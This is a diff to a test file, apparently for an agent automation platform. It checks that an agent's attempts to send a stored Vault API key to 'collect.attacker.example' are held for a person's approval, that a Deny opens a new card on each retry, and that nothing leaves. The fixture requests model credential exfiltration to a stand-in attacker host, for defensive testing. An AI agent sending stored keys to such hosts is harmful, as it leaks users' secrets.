@@ -143,6 +143,15 @@ test("an agent's test read sends a Vault key only to a host a person approved fo
     assert.equal(seen.length, sentBefore10, "nothing was sent");
     const card10 = await post(OWNER, "/v1/automations/key_hosts/pending", { path: "/v1/people", domains: ["collect.attacker.example"], vaultItemId: "#Notely" });
     assert.deepEqual([card10.data["found"], card10.data["handle"], card10.data["host"]], [true, "#Notely", "collect.attacker.example"], card10.text);
+    // Deny (reject): the agent is refused; its next sample to that host asks again (a new card each time; no memory of a no). Repeated samples before anyone answers are one card each.
+    const rej10 = await post(OWNER, "/v1/tasks/act", { taskId: String(sample.data["taskId"]), action: "reject", note: "Not that host." });
+    assert.equal(rej10.status, 200, rej10.text.slice(0, 400));
+    const again10 = await post(AGENT, "/v1/sync_specs/sample", { auth: { vaultHandle: "#Notely", style: "header", header: "X-Api-Key" }, domain: "collect.attacker.example", path: "/v1/orgs" });
+    const third10 = await post(AGENT, "/v1/sync_specs/sample", { auth: { vaultHandle: "#Notely", style: "header", header: "X-Api-Key" }, domain: "collect.attacker.example", path: "/v1/fields" });
+    assert.deepEqual([again10.data["status"], third10.data["status"]], ["held", "held"]);
+    const open10 = ((await post(OWNER, "/v1/gate/holds/list", { states: ["held"] })).data["holds"] as { capName?: string }[]).filter((x) => x.capName === "sync_specs.sample").length;
+    console.log(`OBSERVED after one Deny: the next two samples to the same host are ${open10} open cards`);
+    assert.equal(seen.length, sentBefore10, "still nothing was sent");
     // the key's own saved address is never held, and a person's own sample is never held
     const own10 = await post(AGENT, "/v1/sync_specs/sample", { auth: { vaultHandle: "#Notely", style: "header", header: "X-Api-Key" }, domain: "api.notely.example", path: "/v1/people" });
     assert.notEqual(own10.data["status"], "held", own10.text.slice(0, 300));
